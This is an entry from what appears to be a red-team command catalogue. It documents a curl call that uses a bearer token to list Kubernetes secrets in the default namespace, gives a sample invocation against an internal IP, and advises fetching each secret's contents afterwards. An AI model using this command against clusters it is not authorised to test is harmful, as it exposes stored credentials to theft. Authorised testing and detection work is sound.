---
id: a145947a-3e57-4644-a6c5-4c4566de62a6
name: curl-kubernetes-list-secrets-default
type: command
executor: bash
data: >-
  curl -v -H "Authorization: Bearer $_JWT_TOKEN"
  https://$_API_SERVER/api/v1/namespaces/default/secrets/
output: null
created_at: '2023-04-06T03:56:01.386048+00:00'
updated_at: '2023-04-10T20:34:01.659280+00:00'
platforms:
  - Kubernetes
tags:
  - discovery
  - kubernetes
verified: true
validated: true
---

# curl-kubernetes-list-secrets-default

## Command

```bash
curl -v -H "Authorization: Bearer $_JWT_TOKEN" https://$_API_SERVER/api/v1/namespaces/default/secrets/
```

## Description

Lists all secrets in the Kubernetes default namespace, exposing stored credentials or keys for potential extraction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_JWT_TOKEN | Bearer token for API authentication | Yes |
| $_API_SERVER | Kubernetes API server URL | Yes |
| -v | Verbose output | No |
| -H | Authorization header | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9..." https://192.168.1.100:6443/api/v1/namespaces/default/secrets/
```

## Expected Output

JSON list of secrets:

```json
{
  "kind": "SecretList",
  "items": [
    {
      "metadata": {
        "name": "db-password"
      },
      "type": "Opaque"
    }
  ]
}
```

Look for 200 OK; follow up with GET /secrets/{name} to retrieve content.

## Related

- [[procedures/Kubernetes-Endpoint-Enumeration]]
- [[commands/curl-kubernetes-list-pods-default]]
